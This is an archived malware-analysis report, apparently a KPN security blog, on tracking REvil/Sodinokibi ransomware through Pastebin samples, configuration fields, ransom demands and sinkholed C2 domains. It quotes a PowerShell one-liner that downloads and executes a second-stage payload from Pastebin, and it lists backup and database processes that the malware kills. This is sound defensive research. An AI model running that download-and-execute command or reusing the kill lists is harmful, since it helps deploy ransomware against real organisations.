{
    "id": "fdbeaddd-b79f-4512-9d88-1d3b4aa76255",
    "created_at": "2023-01-12T15:04:03.310711Z",
    "updated_at": "2025-03-27T02:06:02.441988Z",
    "deleted_at": null,
    "sha1_hash": "1ba3bab5a97d3c9b57e4997640fb8793631074ef",
    "title": "2020-01-28 - Tracking REvil",
    "authors": "",
    "file_creation_date": "2022-05-28T04:06:05Z",
    "file_modification_date": "2022-05-28T04:06:05Z",
    "file_size": 1797901,
    "plain_text": "# Tracking REvil\n\n**kpn.com/security-blogs/Tracking-REvil.htm**\n\nAfter the message GandCrab quit, a hole was left in the scene. It was time for a new contender.\nIn the last few months REvil/Sodinokibi seems to have filled that gap. There already have been\nmultiple blogs describing the similarities between GandCrab and REvil affiliates. We’ll stay clear\nof the similarities in this blog and focus on the usage statistics of the ransomware family by\nlooking at samples, infection rates and ransom demands.\n\n### TLDR:\n\nThis blog describes our efforts in tracking the REvil ransomware and its affiliates for the past six\nmonths. REvil has been around since 2019 and is one of the top variants of ransomware\ncausing havoc at many organizations around the globe ever since. The KPN Security Research\nTeam was able to acquire C2 sinkholes allowing for the tracking of infections across the globe.\n\nThis research started by tracking REvil samples distributed via pastebin. The configuration\nextracted from these samples show a different strategy of the several affiliates. Detonating\nthese samples in a sandbox and emulating traffic to the ransom site gave us the ability to track\nransom demands per group and campaign. Analyzing the configuration of the different samples\nmade us realize the C2 domains were identical across all samples. The team was able to\nsinkhole multiple REvil C2 domains . The REvil C2 traffic is unidirectional and solely used for1\nstatistics. Piggybacking the C2 we can gain insight into the statistical data.\n\nThe affiliates using the REvil ransomware as a service (RaaS) are skilled and adapting their\napproach to the victim’s organization. We assume the attacks are often not targeted but more\nopportunity based. Access that is gained in some way is later escalated in order to take over an\nentire network. In the past 5 months we've analyzed over 150 000 unique infections, extracted\nransom demands from 148 samples together demanding more than 38 million dollars. Some of\nthe attacks are on a huge scale. Just in the last 7 days the REvil affiliates were able to encrypt\nover 6500 unique systems in two mayor attacks in both Europe and Africa. Topping all\ninfections combined in the past 30 days.\n\nAs a security industry we have the task to strengthen our clients against such attacks. The\nmost important defense is to have an offsite backup that is not “deletable” from the operational\ninfrastructure. Next to proper backups consider segmentation, patch management, pentesting,\nsecurity baseline and other fun stuff.\n\n## Proliferation via Pastebin\n\n\n-----\n\n[This all started when we were talking with @RonnyTNL about an interesting attack scenario. It](https://twitter.com/RonnyTNL)\nstarted with a standard PowerShell one-liner to download and execute the malware. The\nsecond PowerShell stage was distributed via PasteBin.\n```\nC:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"IEX (New-Object\nSystem.Net.WebClient).DownloadString('https://pastebin.com/raw/Za3T5yJk');InvokeKQMRZLUDUPNBP;Start-Sleep -s 10000\"\n\n```\nAnalysis of the 2nd stage script shows it is essentially the “Invoke-ReflectivePEInjection.ps1”\n[script by Joe Bialek (@JosephBialek), optimized with an additional function to pass a base64](https://twitter.com/JosephBialek)\nencoded DLL to the main function. The following pattern was used to randomize function\nnames “Invoke-[A-Z]{15}”. After seeing a couple of the scripts in PasteBin we decided to use\nthe PasteBin API to download each new record. In order to detect the script, the following regex\nwas used: “0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9”. It worked great from the\nstart however we suddenly saw an uptick in new samples being downloaded. After investigation\nit turned out the Buran ransomware family also used the same script and PasteBin for\ndistribution. Luckily, there is a very specific difference between the two types allowing us to\ndiscern between the two families.\n\nBy analyzing the DLL that’s injected in memory, we can see that the malware family\ndynamically imports its dependencies (see https://blag.nullteilerfrei.de/2019/11/09/api-hashing[why-and-how/). @leandrovelasco and me had a fun time trying to figure out the encryption](https://twitter.com/LeandroNVelasco)\nfunctionality. After the first frustrating evening we luckily found the Cylance blog describing that\nthe “obfuscation” we were looking at was in fact just RC4. For every PowerShell script we\ndownload from PasteBin, we first extract the base64 dll, and then extract the configuration. The\nconfiguration is extracted using the python script from the Cylance blog:\n[(https://threatvector.cylance.com/en_us/home/threat-spotlight-sodinokibi-ransomware.html).](https://threatvector.cylance.com/en_us/home/threat-spotlight-sodinokibi-ransomware.html)\n\nAnalyzing the configuration data allows us to see the difference between various operators. The\nconfiguration allows attackers to kill certain processes and services and remove specific files.\nLooking at these characteristics might tell us something about the groups modus operandi.\n\n## Spotting differences in the configurations\n\nThe configurations extracted contain many different fields, the ones we are interested in for the\npurposes of this blog are:\n\n**Option** **Fuction**\n\nPID Affiliate ID\n\nSUB Campaign ID\n\nDMN List of 1100 different domains where the c2 information is sent.\n\nPRC List of processes to kill\n\n\n-----\n\n**Option** **Fuction**\n\nSVC List of services to kill\n\nNNAME Ransom note filename\n\nNET Boolean turning C2 traffic on and off\n\nFor a full list see (https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-atr-analyzes-sodinokibi-aka-REvilransomware-as-a-service-what-the-code-tells-us/)\n\n### PRC and SVC\n\nThe variables contain a list of all processes or services that need to be stopped. Looking at the\nlist of processes to kill you can see most of the groups use the default list. Things start to get\ninteresting when the list contains more specific or different process names. For example, the\ngroup identified by 23 (AKA PID 23) included a process called “CagService” in one sample only.\nThe process is related to a remote management tool called CentraStage. Group 12 (AKA PID\n12) has a sample that kills “ax32.exe” a process related to Microsoft Dynamics. Showing that\nthe samples are either modified to suit specific targets or the different groups are learning and\nimproving their process-kill-lists.\n\nSome of the more uncommon processes:\n\n**Process name** **Description**\n\nThebat.exe A secure mail client platform\n\nPvlsvr.exe Veritas backupexec\n\nVeeamDeploymentSvc.exe Part of Veaam backup\n\nDocueWare.Desktop.exe Docuware document management system\n\nOracle.exe Oracle dbms\n\nThe same goes for services that are to be killed, in this list you can find things like Altaro,\nVeritas Backupexec and Arcserve UDP. A complete list of all services and processes can be\nfound in the appendix.\n\n### SUB\n\nWe assume the SUB option is the campaign id. Analyzing the different SUB values in the\nsamples we collected we noticed the number is incremented for each sample. This gives us an\nindication of the number of campaigns that are prepared in the REvil backend. It’s does not\n\n\n-----\n\nnecessarily mean that the samples prepared are deployed in the real world. Just that the\ncampaign is created. It also gives us the ability to guesstimate the number of prepared\ncampaigns per period of time.\n\nFigure 1 incrementing SUB value.\n\nLooking at the samples we retrieved we used this to count the number of campaigns per\nmonth.\n\n**Month** **Number of campaigns**\n\nDecember +-300\n\nNovember +-300\n\nOctober +-400\n\nSeptember +-100\n\nAugust +-200\n\nWe can also see how active different groups are compared to other groups based on the\nnumber of unique campaign ids (sub).\n\n\n-----\n\nFigure 2 5 of the most active groups.\n\n## Tracking ransom demands\n\nHaving access to the samples allows any user to check the ransom demand. Once a sample\nruns, the malware creates a unique-system-id based on the VolumeID and the CPUID. This id\nis used to create a unique link to the backend using the following structure:\ndecryptor[.]top/unique-system-id. Next to this, a base64 encoded-encrypted json object is\ngenerated. The json object contains information such as affiliate id (pid), campaign id (sub),\noperating system (os) and username (unm).\n\nFigure 3 the system id in the URL and the beginning of the base64 encoded-encrypted json\nobject.\n\n\n-----\n\nWe wanted to be able to automatically retrieve and submit these values to the backend in order\nto retrieve the ransom demand per sample. We were using a Python script to retrieve samples\nfrom Pastebin. A small change to the procedure should allow us to add the ability to retrieve\nransom demands. One thing missing was an environment to detonate the samples in. We used\nthe tria.ge sandbox to detonate the samples. The process is as follows:2\n\nFigure 4 process\n\n1. Get sample from pastebin\n\n[2. Submit to tria.ge (example sample)](https://tria.ge/reports/191220-matk4mdz1j/task1)\n3. Extract the ransom note from the from the kernel monitor\n4. Parse the ransom note and submit to the REvil backend\n5. Parse the webpage in order to retrieve the ransom demands\n\nFigure 5 group and campaign ids with their demanded ransom.\n\nThe ransom demands vary greatly, the cheapest we’ve seen was 777 dollars. The highest\n[we’ve observed was 3 million. 15 million in the case of CyrusOne but that one was not scraped](https://twitter.com/rikvduijn/status/1202944763852460032)\nby us from PasteBin. Initially we thought we would be able to see which campaign resulted in\nan actual payment. We assumed we could track transactions on bitcoin addresses we saw\npassing by and verify whether any transactions took place to and from that bitcoin address.\nAfter checking for a while, we never saw any transactions. We decided to do a test and\ndetonated the same sample twice in the sandbox\n\n\n-----\n\nAfter submitting the data to the backend, it became clear the ransom demand stayed the same,\nthe BTC address changed. It seems the developers made payment tracking difficult by creating\nnew wallets for every user that requests the payment instructions. We can take a look at the\naverage amount that is being requested. Across 148 samples a total of 38+ million dollar is\nbeing demanded. Averaging a ransom demand of 260 000+ dollar.3\n\nWhen splitting this up between computer and network focused attacks it become apparent how\nmuch some of these attacks cost. Network only attacks average a ransom demand of 470 000+\n$ (75 samples) while computer based are averaging 48 000+ $ (73 samples). We suspect the\noperators might have misconfigured some campaigns as we could see samples demanding\n500 000 for the decryption of one computer.\n\nFigure 6 outliers\n\nAnother option is that “your computer has been infected” means something else then we are\nassuming.\n\nIf we combine the above averages with the number of campaigns that were generated in the\nREvil backend (2600+). We can safely assume the total amount of demanded ransom by the\nREvil affiliates is well over 100 million.\n\n## Sinkholing domains\n\nThe DMN option in the configuration describes the list of domains to be contacted. Every\nsample that is generated contains the same large list of 1100 domains. The ransomware will\nonly contact them if the “net” Boolean is set to true. The large list could be used to hide the\nactual C2 or all websites within the list are hacked. Anyone analyzing the list could assume so\nas all websites in the list are in fact running WordPress. Giving the impression that the\nattackers could have compromised the WordPress sites. However, a quick analysis of the\ndifferent WordPress versions shows a large variation in installed versions and used plugins.4\nThey could still be all hacked, but it seems a lot of work.\n\nWe decided to go through the list of domains to check if any domain was unregistered. This\ngave us various domains that were still free. We decided to register the domains in order to\ngather data on REvil infections. A first look at the data was disappointing, the ransomware\n\n\n-----\n\nsubmits an encrypted blob to the C2. This encrypted blob is a json object containing information\nlike group id (PID), campaign id (SUB) and system name and username. Since we had no way\nof getting to the data, we had limited capability to get an insight into the amount of infections.\n\n### Discerning unique systems behind one NAT-ed IP\n\nIf a network is infected and multiple unique systems are being encrypted there would be no way\nto know. In order to see if it was possible to detect unique infected systems coming from one IP,\nwe decided to hash any encrypted blob sent to us. The assumption being that an encrypted\nblob from one system would be uniquely identifiable. We tested this by infecting one of our own\nlab systems multiple times. We observed the same cryptoblob being sent to multiple of our\nsinkholes. Reverting the VM’s and reinfecting showed different hashes for the cryptoblobs.\nUsing this information, we assume one cryptoblob-hash is equal to: the runtime of one REvil\nsample. Since the REvil ransomware usually only runs once we assume one cryptohash to be\nequal to one unique infected system.\n\n### Gathering statistics from the sinkhole\n\nIt turns out that not every sample hits all the 1100 configured C2 domains. In fact some don’t\nconnect to the C2’s at all (the NET Boolean field is used to configure this behavior per sample).\nHaving multiple domains allows us to detect infections that hit only a portion. However, we do\nnot have full visibility on all infections worldwide. Looking at one infection we observed 180\nunique crypthashes, those unique hashes are distributed across various of our sinkhole\ndomains. The image below shows how one IP hit various sinkholes.\n\nFigure 7 One unique IP with unique infections across multiple sinkhole domains.\n\nLooking at the unique cryptohashes we can see the same hash hitting multiple of our sinkholes\nbut not all of our sinkholes. This means we do not receive all infections.\n\n\n-----\n\nFigure 8 Hits per domain\n\nUsing the cryptoblob-hash we are able to count the amount of unique systems encrypted per\nweek.\n\nFigure 9 Unique infections per week, going back three months.\n\n\n-----\n\nFigure 10 Worldwide overview.\n\nThe world map shows REvil infections across the world. Looking at the map shows SouthKorea and China are some of the most hit countries. We’ve been unable to attribute the large\nnumber of unique hits from South-Korea and China. Some of the IP’s seem related to an ISP\nbut no clear whois data, domains or certificate seem to point to them. The map also shows how\nquiet it is in Russia only seeing a couple of unique infections. The malware itself checks the\nsystem language and online adverts by the REvil RAAS providers also states no operation\ninside of the Commonwealth of Independent States (CIS). The limited number of infections can\nbe attributed to testing of the ransomware or employees on a business trip inside of Russia.\n\n\n-----\n\nFigure 11 worldwide distribution note: South-Korea related events where filtered out of this\npicture.\n\nLooking at the infection traffic we came up with three ideas:\n\n1. The IP’s are all related to home-systems and the ISPs in Korea choose to NAT multiple\n\nclients behind the same IP.\n\n2. Someone was running a large set of sandboxes from South Korea. The same IP’s hit\n\nmultiple times over months which is strange for this type of ransomware.\n3. A *very* active actor targeting South Korea.\n\nFigure 12 Top 10 most hit countries based on unique crypthashes (e.g. infections)\n\nThe daily average is around 500+ unique encrypted systems. Not accommodating for\nsandboxes etc. The regular days are not that interesting; however, the peaks are. Every peak\nrepresents a large attack an MSP hacked or one or more large organization compromised.\nInvestigating these shows not one IP responsible but many smaller ones.\n\n\n-----\n\nFigure 13 looking at the peaks.\n\nMost of the peaks shown in the picture above hit the news. Other companies managed to keep\nthe breaches out of the public. Which is impressive as some of the attacks had mayor impact\non the affected businesses. One of the attacks stopped all operations at different locations of a\nvictim, causing an active discussion online by both its employees as well as its clientele.\n\n### Impact on the Netherlands\n\nWe enriched the sinkhole data with GeoIP data in order to see any attacks against the\nNetherlands. REvil infections in the Netherlands seems to be very low for the time being. We’ve\nobserved 250+ unique system encryptions in the Netherlands. This seems low when comparing\nto other countries, the US has 300 million citizens and 22000+ encrypted unique systems.\nComparing to the Dutch 17 million citizens and 250+ unique infections this means the US has 6\ntimes more infections then the Netherlands.\n\n\n-----\n\nFigure 14 Dutch infections\n\nThe limited number of infections in the Netherlands is reassuring but could change quickly. Just\nin the last 7 days there have been two mayor attacks in both Europe and Africa. More than\ndoubling the infections in those regions. This means one attack against a large Dutch MSP\ncould change the statistics drastically.\n\n\n-----\n\nFigure 15 Infection in both Europe and Africa.\n\n## Conclusion\n\nWe’ve seen 150 000 unique infections in the past 5 months. And a total of 148 samples\ntogether demanding more than 38 million dollars. Some of the attacks are on a huge scale,\nencrypting over 3000 unique systems in one attack. Some of these attacks where discussed in\nthe news, but many companies remained silent. Keep in mind we have a limited visibility of all\nsamples; we only extract samples from pastebin. For the infection traffic we don’t have visibility\non samples that disable the C2 traffic. Next to this not every sample hits all of the c2 domains.\nAll statistics shown in this blog are a subset of the total scale. The actual problem is even\nbigger than we can measure.\n\nThe affiliates using the REvil ransomware as a service (RAAS) are skilled and adapting their\napproach to the victims organization. The CyrusOne sample actually stated the name of the\ncompany including the name of the victim companies that were also victimized. Some samples\ncontain very specific applications to be killed. This doesn’t necessarily mean all of these attacks\nare targeted just that the actors found some form of access (RDP, web scanning or phishing)\nand manually escalated privileges in order to hack the entire network not just one host.\n\nWith the rise of more mature and big malicious business relaying on ransomware it is apparent\nthat infosec plays crucial role. The most important step we as a security industry is secure\noffsite backups that are not removable from the network or using privileges acquired within the\nnetwork. After that we can spend time actually securing our networks.\n\n\n-----\n\nThe samples use 1100 different domains to send back statistics. Most of these domains are non-malicious and not\nrelated to the attackers. For the sake of brevity we say C2 while in fact the websites are unwilling recipients of the\nstatistics data. Its still unclear which domains are related to the REvil C2 statistics.\n\n2\n\nThanks to Jurriaan Bremer for modifying the tria.ge sandbox kernel module, it now randomizes the systems volumeid\n\nonce requested. This allowed us to keep using the same system for all samples, having a unique-system-id to submit.\n\n3\n\nKeep in mind we have a limited visibility on the samples, we track the samples that are distributed via pastebin and\nother that we find (like the Cyrus One sample). There is a possibility other samples might lower or increase this number.\n\n4\n\nThanks to Yonathan Klijnsma from RiskIQ who was able to get the WordPress version and plugin version data on all\nthe various domains.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-28 - Tracking REvil.pdf"
    ],
    "report_names": [
        "2020-01-28 - Tracking REvil.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535843,
    "ts_updated_at": 1743041162,
    "ts_creation_date": 1653710765,
    "ts_modification_date": 1653710765,
    "files": {
        "pdf": "https://archive.orkl.eu/1ba3bab5a97d3c9b57e4997640fb8793631074ef.pdf",
        "text": "https://archive.orkl.eu/1ba3bab5a97d3c9b57e4997640fb8793631074ef.txt",
        "img": "https://archive.orkl.eu/1ba3bab5a97d3c9b57e4997640fb8793631074ef.jpg"
    }
}